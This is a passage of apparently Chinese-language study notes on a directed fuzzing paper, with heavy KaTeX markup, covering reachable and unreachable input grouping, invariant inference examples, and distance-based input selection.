class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">B(a,b,c,d):(6,8,10,10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>12</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>30</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(a,b,c,d):(12,5,30,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>12</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D(a,b,c,d):(6,10,12,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>100</mn><mo separator="true">,</mo><mn>12</mn><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(a,b,c,d):(6,100,12,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></eq></li></ul></li><li>Halo记录输入字节影响变量abc的及他们的值<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub><mo>=</mo><mi>B</mi><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>D</mi><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>E</mi><mo>:</mo><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>100</mn><mo separator="true">,</mo><mn>12</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_{reach} = B:(6,8,10),D:(6,10,12),E:(6,100,12)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">12</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>u</mi><mi>n</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub><mo>=</mo><mi>A</mi><mo>:</mo><mo stretchy="false">(</mo><mn>15</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>C</mi><mo>:</mo><mo stretchy="false">(</mo><mn>12</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>30</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_{unreach} = A:(15,5,10),C:(12,5,30)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">15</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">10</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30</span><span class="mclose">)</span></span></span></span></eq></li></ul></li></ul></li></ul><h5 id="invariant-inference" tabindex="-1">Invariant Inference</h5><ul><li><p>通过分组的不变量，我们推断不变量 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mrow><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub><mo separator="true">,</mo><msub><mi>I</mi><mrow><mi>u</mi><mi>n</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">I_{reach},I_{unreach}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 为每个组的输入 （算法1 Line5-6）</p></li><li><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mrow><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub><mo separator="true">,</mo><msub><mi>I</mi><mrow><mi>u</mi><mi>n</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">I_{reach},I_{unreach}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 分别表示达到目标的可能条件和没有触发目标的条件，因此，我们新生成的不变量需要满足 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mrow><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">I_{reach}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 并且满足 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mrow><mi>u</mi><mi>n</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">I_{unreach}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 的反面</p></li><li><p><strong>Example 3.3</strong></p><ul><li><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>I</mi><mrow><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub><mo>=</mo><mi>a</mi><mo>&lt;</mo><mn>7</mn><mo separator="true">,</mo><mi>b</mi><mo>&gt;</mo><mn>7</mn><mo separator="true">,</mo><mi>c</mi><mo>≤</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">I_{reach} = a&lt;7,b&gt;7,c\leq 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span></span></eqn></section></li><li><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>I</mi><mrow><mi>u</mi><mi>n</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi></mrow></msub><mo>=</mo><mi>a</mi><mo>&gt;</mo><mn>12</mn><mo separator="true">,</mo><mi>b</mi><mo>&lt;</mo><mn>6</mn><mo separator="true">,</mo><mi>c</mi><mo>≥</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">I_{unreach}=a&gt;12,b&lt;6,c\geq 20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span></span></eqn></section></li><li>此时我们可以确定输入满足 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>a</mi><mo>&lt;</mo><mn>7</mn><mo separator="true">,</mo><mi>a</mi><mo>≤</mo><mn>12</mn><mo separator="true">,</mo><mi>b</mi><mo>&gt;</mo><mn>7</mn><mo separator="true">,</mo><mi>b</mi><mo>≥</mo><mn>7</mn><mo separator="true">,</mo><mi>c</mi><mo>≤</mo><mn>10</mn><mo separator="true">,</mo><mi>c</mi><mo>≤</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">a &lt; 7, a ≤ 12, b &gt; 7, b ≥ 7, c ≤ 10, c ≤ 20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">12</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span></span></eqn></section></li></ul></li></ul><h5 id="remark-1-%E8%AE%A8%E8%AE%BA1" tabindex="-1">Remark 1 讨论1</h5><ul><li>与传统的通过符号执行推断精确的推断路径条件相比，推断不变量是一种轻量级的估计，尽管比实际路径条件要不准确一些</li><li>然而，通过可达不变量和不可达不变量，也足够用来高效的筛选不可达输入生成</li><li>仅利用执行反馈和输入，在处理复杂程序行为时（如循环）具有更好的延展性。</li><li>此外，与现有动态不变量推理方法不同，后者由于记录执行过程中的中间值而引入了显著的运行时开销，导致了可扩展性问题[26],我们只推断输入之间的关系以解决indirect input generation问题，从而减少了开销</li><li>尽管筛选推断出不变量过滤unreach输入是有效的，但在处理大的输入搜索空间且伴随 （1）爆炸性输入 （2）复杂关系时，使用不变量推理进行模糊测试仍十分困难</li><li>因此，我们的目标是最小化这两个因素在不变量推理中引起的维度爆炸，以提高模糊测试的可扩展性</li></ul><h4 id="3.2-efficient-invariant-inference-with-distance-based-input-selection" tabindex="-1">3.2 Efficient Invariant Inference with Distance-based Input Selection</h4><ul><li>尽管提升输入的数量可以提高不变量推理的准确性，但是这会导致不变量推理引擎的运行时间增加，同时会导致缺陷提升，因为生成的输入可能不会满足目标条件</li><li>为了高效的推断准确的不变量，我们的目标时使用最小化的代表性输入来准确的描绘目标条件。具体的，我们观察到每个输入对准确推断不变量的贡献不同，这将激励我们最小化不变量推断需要的输入集合</li><li><strong>Example 3.4</strong><ul><li>考虑 Example3.2中的输入，我们注意到输入 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq> 没有改变推断结果因为其被 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation 